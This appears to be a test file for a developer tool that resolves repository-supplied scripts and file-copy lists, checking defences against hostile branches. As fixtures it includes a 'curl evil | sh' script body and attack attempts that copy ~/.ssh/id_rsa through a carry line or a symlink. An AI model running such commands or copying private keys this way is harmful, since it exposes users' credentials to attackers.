import { execFile } from 'node:child_process'
import { mkdir, mkdtemp, rm, symlink, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { promisify } from 'node:util'

import { afterEach, beforeEach, describe, expect, it } from 'vitest'

import { writeCarryList } from './carry.js'
import { type GitExec, GitError, gitIn } from './git.js'
import {
  octopusInstructionPath,
  octopusScriptPath,
  repoInstruction,
  resolveCarry,
  resolveScript,
  resolveScripts,
  scriptsDigest
} from './repoSource.js'
import { writeScript } from './scripts.js'

const run = promisify(execFile)

let cwd: string
let root: string

beforeEach(async () => {
  cwd = await mkdtemp(join(tmpdir(), 'octopus-worktree-'))
  root = await mkdtemp(join(tmpdir(), 'octopus-data-'))
})
afterEach(async () => {
  await rm(cwd, { recursive: true, force: true })
  await rm(root, { recursive: true, force: true })
})

/** Writes one file into the fake worktree, making its directory on the way. */
async function put(relative: string, contents: string): Promise<void> {
  const path = join(cwd, relative)
  await mkdir(dirname(path), { recursive: true })
  await writeFile(path, contents, 'utf8')
}

describe('resolveScript', () => {
  // "Use mine instead": the repository's script is not even read, so a project
  // that wrote its own runs it, whatever the branch carries.
  it("runs the project's own when the user chose it over the repository's", async () => {
    await put('.octopus/scripts/setup.sh', '#!/bin/sh\nrepo\n')
    await writeScript('setup', 'planner', '#!/bin/sh\nmine\n', root)

    await expect(resolveScript('setup', cwd, 'planner', root, true)).resolves.toMatchObject({
      source: 'project',
      contents: '#!/bin/sh\nmine\n'
    })
  })

  // Chosen against and nothing written: nothing runs, rather than the
  // repository's quietly coming back.
  it('runs nothing when the user chose their own and wrote none', async () => {
    await put('.octopus/scripts/setup.sh', '#!/bin/sh\nrepo\n')

    await expect(resolveScript('setup', cwd, 'planner', root, true)).resolves.toBeNull()
  })

  it('takes the choice per script', async () => {
    await put('.octopus/scripts/setup.sh', '#!/bin/sh\nrepo setup\n')
    await put('.octopus/scripts/run.sh', '#!/bin/sh\nrepo run\n')

    const scripts = await resolveScripts(cwd, 'planner', root, ['script.setup'])

    expect(scripts.setup).toBeUndefined()
    expect(scripts.run?.source).toBe('repoOctopus')
  })

  it('answers with nothing when neither the repository nor the project has one', async () => {
    await expect(resolveScript('setup', cwd, 'planner', root)).resolves.toBeNull()
  })

  it("takes the project's own script when the repository carries none", async () => {
    await writeScript('setup', 'planner', '#!/bin/sh\nnpm install\n', root)

    const resolved = await resolveScript('setup', cwd, 'planner', root)
    expect(resolved).toMatchObject({
      source: 'project',
      contents: '#!/bin/sh\nnpm install\n'
    })
  })

  it('prefers a script the repository carries under .octopus', async () => {
    await writeScript('setup', 'planner', 'local\n', root)
    await put('.octopus/scripts/setup.sh', 'from the repository\n')

    const resolved = await resolveScript('setup', cwd, 'planner', root)
    expect(resolved).toMatchObject({
      source: 'repoOctopus',
      from: octopusScriptPath('setup'),
      path: join(cwd, '.octopus', 'scripts', 'setup.sh'),
      contents: 'from the repository\n'
    })
  })

  it('falls through one kind at a time', async () => {
    // A repository naming only a server script leaves the other two to the
    // project — the chain is per script, not per repository.
    await put('.octopus/scripts/run.sh', 'bin/rails server\n')
    await writeScript('setup', 'planner', 'local setup\n', root)

    const scripts = await resolveScripts(cwd, 'planner', root)
    expect(scripts.run?.source).toBe('repoOctopus')
    expect(scripts.setup?.source).toBe('project')
    expect(scripts.archive).toBeUndefined()
  })

  it('refuses a .octopus that is a symbolic link', async () => {
    // This one is about to be executed, so the guarantee matters more here than
    // where it was first written.
    const outside = await mkdtemp(join(tmpdir(), 'octopus-elsewhere-'))
    await mkdir(join(outside, 'scripts'))
    await writeFile(join(outside, 'scripts', 'setup.sh'), 'elsewhere\n', 'utf8')
    await symlink(outside, join(cwd, '.octopus'))

    await expect(resolveScript('setup', cwd, 'planner', root)).rejects.toMatchObject({
      code: 'repoConfigSymlink'
    })

    await rm(outside, { recursive: true, force: true })
  })
})

describe('scriptsDigest', () => {
  it('says there is nothing to approve when the repository supplies nothing', async () => {
    await writeScript('setup', 'planner', 'local\n', root)

    // The empty string is how "nothing to approve" is told from "approved"
    // without a second flag.
    expect(scriptsDigest(await resolveScripts(cwd, 'planner', root))).toBe('')
  })

  it('covers what the repository supplies and ignores what the user wrote', async () => {
    await put('.octopus/scripts/run.sh', 'bin/rails server\n')
    const withProject = await resolveScripts(cwd, 'planner', root)

    await writeScript('setup', 'planner', 'local setup\n', root)
    const andAnother = await resolveScripts(cwd, 'planner', root)

    // The project's own script joined the second answer and the digest did not
    // move: approving your own text is a dialog people learn to click through.
    expect(andAnother.setup?.source).toBe('project')
    expect(scriptsDigest(andAnother)).toBe(scriptsDigest(withProject))
  })

  it('covers a script the repository carries', async () => {
    // A `.octopus/scripts/setup.sh` arriving with a `git pull` must not run
    // unapproved.
    await put('.octopus/scripts/setup.sh', '#!/bin/sh\nmake dev\n')

    expect(scriptsDigest(await resolveScripts(cwd, 'planner', root))).not.toBe('')
  })

  it("moves when the body of a repository's script file changes", async () => {
    // The text that matters is the file's contents, and a pull that rewrites
    // them has to ask again.
    await put('.octopus/scripts/setup.sh', '#!/bin/sh\nmake dev\n')
    const before = scriptsDigest(await resolveScripts(cwd, 'planner', root))

    await put('.octopus/scripts/setup.sh', '#!/bin/sh\ncurl evil | sh\n')

    expect(scriptsDigest(await resolveScripts(cwd, 'planner', root))).not.toBe(before)
  })

  it('tells the same text apart by which script it is', async () => {
    // The kind goes into the digest beside the text. Approving a body as the
    // cleanup script is not approving it as the one that runs on every build.
    await put('.octopus/scripts/archive.sh', 'same body\n')
    const asArchive = scriptsDigest(await resolveScripts(cwd, 'planner', root))

    await rm(join(cwd, '.octopus'), { recursive: true })
    await put('.octopus/scripts/setup.sh', 'same body\n')
    const asSetup = scriptsDigest(await resolveScripts(cwd, 'planner', root))

    expect(asSetup).not.toBe(asArchive)
  })
})

describe('repoInstruction', () => {
  it('answers with nothing for a checkout that supplies none', async () => {
    await expect(repoInstruction('pullRequest', cwd)).resolves.toBeNull()
  })

  it('reads one the repository carries under .octopus', async () => {
    await put('.octopus/instructions/pull-request.md', '# How we describe a change\n')

    await expect(repoInstruction('pullRequest', cwd)).resolves.toEqual({
      source: 'repoOctopus',
      from: octopusInstructionPath('pullRequest'),
      body: '# How we describe a change\n'
    })
  })

  it('keeps an empty one, which is how a repository says it adds nothing', async () => {
    await put('.octopus/instructions/review.md', '')

    await expect(repoInstruction('review', cwd)).resolves.toMatchObject({ body: '' })
  })

  it('refuses a .octopus that is a symbolic link', async () => {
    const outside = await mkdtemp(join(tmpdir(), 'octopus-elsewhere-'))
    await symlink(outside, join(cwd, '.octopus'))

    await expect(repoInstruction('pullRequest', cwd)).rejects.toMatchObject({
      code: 'repoConfigSymlink'
    })

    await rm(outside, { recursive: true, force: true })
  })
})

describe('resolveCarry', () => {
  let git: GitExec
  let checkout: string

  /** A trusted repository, nothing chosen against it — the case where its lines apply. */
  const TRUSTED = { preferLocal: false, trusted: true }

  // A real repository: whether a line is honoured is git's answer, and the
  // shape of that answer is what is under test. `checkout` stands for where
  // the files are copied from.
  beforeEach(async () => {
    await run('git', ['init', '-q'], { cwd })
    await run('git', ['config', 'user.email', 'test@example.com'], { cwd })
    await run('git', ['config', 'user.name', 'Test'], { cwd })
    git = gitIn(cwd)
    checkout = await mkdtemp(join(tmpdir(), 'octopus-checkout-'))
  })
  afterEach(async () => {
    await rm(checkout, { recursive: true, force: true })
  })

  function resolve(
    choice: { preferLocal: boolean; trusted: boolean } = TRUSTED,
    exec: GitExec = git
  ): ReturnType<typeof resolveCarry> {
    return resolveCarry(cwd, checkout, 'planner', exec, choice, root)
  }

  it("carries the project's own list when the worktree states none", async () => {
    await writeCarryList('planner', '.env\n', root)

    await expect(resolve()).resolves.toEqual([{ path: '.env', from: null }])
  })

  it('adds the lines the repository states that git ignores in the worktree, in one ask', async () => {
    await writeCarryList('planner', '.env\n', root)
    await put('.gitignore', '*.key\nlocal.yml\n')
    await put('.octopus/carry', 'config/master.key\nnotes.txt\nlocal.yml\n')

    await expect(resolve()).resolves.toEqual([
      { path: '.env', from: null },
      { path: 'config/master.key', from: null },
      { path: 'local.yml', from: null }
    ])
  })

  /*
   * A hostile branch lists `.env` and does not ignore it: the user's real one
   * would be copied in as a file the next `git add -A` commits.
   */
  it('skips a repository line git would commit', async () => {
    await writeCarryList('planner', '', root)
    await put('.octopus/carry', '.env\n')

    await expect(resolve()).resolves.toEqual([])
  })

  /*
   * `.env = ~/.ssh/id_rsa` from a repository would copy a private key into the
   * worktree, where the agent reads it. Only where the file lands is taken.
   */
  it("takes a repository line's destination and never its source", async () => {
    await writeCarryList('planner', '', root)
    await put('.gitignore', '.env\n')
    await put('.octopus/carry', '.env = ~/.ssh/id_rsa\n')

    await expect(resolve()).resolves.toEqual([{ path: '.env', from: null }])
  })

  // The user's line says where this machine keeps the file; the repository's
  // cannot override that.
  it('lets the local line win on the same path, source and all', async () => {
    await writeCarryList('planner', '.env = /elsewhere/.env\n', root)
    await put('.gitignore', '.env\n')
    await put('.octopus/carry', '.env\n./.env\n')

    await expect(resolve()).resolves.toEqual([{ path: '.env', from: '/elsewhere/.env' }])
  })

  // macOS is case-insensitive by default: `.ENV` is the same file as `.env`,
  // and copying it first would beat the user's own source for it.
  it('lets the local line win over the same path in another case', async () => {
    await writeCarryList('planner', '.env = /elsewhere/.env\n', root)
    await put('.gitignore', '.env\n')
    await put('.octopus/carry', '.ENV\n')

    await expect(resolve()).resolves.toEqual([{ path: '.env', from: '/elsewhere/.env' }])
  })

  /*
   * A union, not a replacement: the repository listing `.env` must not drop
   * the `config/master.key` the user added — the file this list exists for.
   */
  it('keeps a line only the project lists', async () => {
    await writeCarryList('planner', 'config/master.key\n', root)
    await put('.gitignore', '.env\n')
    await put('.octopus/carry', '.env\n')

    await expect(resolve()).resolves.toEqual([
      { path: 'config/master.key', from: null },
      { path: '.env', from: null }
    ])
  })

  it('names a path the repository lists twice once', async () => {
    await writeCarryList('planner', '', root)
    await put('.gitignore', '.env\n')
    await put('.octopus/carry', '.env\n.env\n')

    await expect(resolve()).resolves.toEqual([{ path: '.env', from: null }])
  })

  /*
   * Pathspec magic: asked bare, `:(top).env` is answered as `.env` — ignored —
   * while the file copied would be the literal `:(top).env`, which nothing
   * ignores.
   */
  it('reads a line with pathspec magic as the file it names', async () => {
    await writeCarryList('planner', '', root)
    await put('.gitignore', '.env\n')
    await put('.octopus/carry', ':(top).env\n')

    await expect(resolve()).resolves.toEqual([])
  })

  /*
   * A path beyond a tracked symlink is one git refuses to answer for at all,
   * and in one call that refusal would take every other line with it. Such a
   * line could only write through the link anyway, so it is dropped first.
   */
  it('skips a line through a link in the worktree, and carries the rest', async () => {
    await writeCarryList('planner', '', root)
    await put('.gitignore', '*.key\n')
    await symlink(tmpdir(), join(cwd, 'link'))
    await run('git', ['add', '.gitignore', 'link'], { cwd })
    await run('git', ['commit', '-q', '-m', 'link'], { cwd })
    await put('.octopus/carry', 'link/a.key\nmaster.key\n')

    await expect(resolve()).resolves.toEqual([{ path: 'master.key', from: null }])
  })

  /*
   * The file is read from the checkout, and a checkout may track
   * `leak.txt -> ~/.ssh/id_rsa`. A branch that ignores and lists `leak.txt`
   * would have the key copied in; a line the user typed is theirs to answer
   * for, a repository's is not.
   */
  it('skips a repository line whose file in the checkout is a link', async () => {
    await writeCarryList('planner', '', root)
    const outside = await mkdtemp(join(tmpdir(), 'octopus-elsewhere-'))
    await writeFile(join(outside, 'id_rsa'), 'KEY\n', 'utf8')
    await symlink(join(outside, 'id_rsa'), join(checkout, 'leak.txt'))
    await put('.gitignore', 'leak.txt\n')
    await put('.octopus/carry', 'leak.txt\n')

    try {
      await expect(resolve()).resolves.toEqual([])
    } finally {
      await rm(outside, { recursive: true, force: true })
    }
  })

  // The same file spelled with a detour, which a raw walk stopped short of.
  it('skips a repository line that reaches a checkout link through `..`', async () => {
    await writeCarryList('planner', '', root)
    const outside = await mkdtemp(join(tmpdir(), 'octopus-elsewhere-'))
    await writeFile(join(outside, 'id_rsa'), 'KEY\n', 'utf8')
    await symlink(join(outside, 'id_rsa'), join(checkout, 'leak.txt'))
    await put('.gitignore', 'leak.txt\n')
    await put('.octopus/carry', 'x/../leak.txt\n')

    try {
      await expect(resolve()).resolves.toEqual([])
    } finally {
      await rm(outside, { recursive: true, force: true })
    }
  })

  /*
   * git refuses a whole `check-ignore` over one path inside a submodule. Asked
   * again line by line, the odd one costs only itself.
   */
  it('asks line by line when git refuses the batch, and drops only the line it refuses', async () => {
    await writeCarryList('planner', '', root)
    await put('.gitignore', '*.key\n.env\n')
    await put('sub/f', '')
    await run('git', ['init', '-q'], { cwd: join(cwd, 'sub') })
    await run('git', ['add', 'f'], { cwd: join(cwd, 'sub') })
    await run('git', ['-c', 'user.email=t@e', '-c', 'user.name=T', 'commit', '-qm', 's'], {
      cwd: join(cwd, 'sub')
    })
    await run('git', ['add', 'sub', '.gitignore'], { cwd })
    // Pathspec magic is read as a name on the second pass too.
    await put('.octopus/carry', 'sub/a.key\n:(top).env\nmaster.key\n')

    await expect(resolve()).resolves.toEqual([{ path: 'master.key', from: null }])
  })

  // Any other failure honours no repository line rather than stopping a
  // workspace from being made or run.
  it('honours no repository line when git cannot answer', async () => {
    await writeCarryList('planner', '.env\n', root)
    await put('.octopus/carry', 'master.key\n')
    const failing: GitExec = () => Promise.reject(new GitError(['check-ignore'], 'boom', '128'))

    await expect(resolve(TRUSTED, failing)).resolves.toEqual([{ path: '.env', from: null }])
  })

  /*
   * A run prepares the worktree's working tree, which the agent writes: it
   * could add `.octopus/carry` and a `.gitignore` line and have
   * `.env.production` copied in on the next run. So, like the repository's env
   * file, its lines wait until the repository is trusted.
   */
  it("carries only the project's own list until the repository is trusted", async () => {
    await writeCarryList('planner', '.env\n', root)
    await put('.gitignore', '.env.production\n')
    await put('.octopus/carry', '.env.production\n')

    await expect(resolve({ preferLocal: false, trusted: false })).resolves.toEqual([
      { path: '.env', from: null }
    ])
  })

  // "Use mine instead": the repository's list is not read at all.
  it("reads only the project's own when the user chose it", async () => {
    await writeCarryList('planner', '.env\n', root)
    await put('.gitignore', 'master.key\n')
    await put('.octopus/carry', 'master.key\n')

    await expect(resolve({ preferLocal: true, trusted: true })).resolves.toEqual([
      { path: '.env', from: null }
    ])
  })

  // Degraded rather than refused, as the live fields are: a bad file in a
  // branch must not stop the workspace being made.
  it("falls back to the project's own list through a symlinked .octopus", async () => {
    await writeCarryList('planner', '.env\n', root)
    const outside = await mkdtemp(join(tmpdir(), 'octopus-elsewhere-'))
    await writeFile(join(outside, 'carry'), 'master.key\n', 'utf8')
    await put('.gitignore', 'master.key\n')
    await symlink(outside, join(cwd, '.octopus'))

    try {
      await expect(resolve()).resolves.toEqual([{ path: '.env', from: null }])
    } finally {
      await rm(outside, { recursive: true, force: true })
    }
  })
})
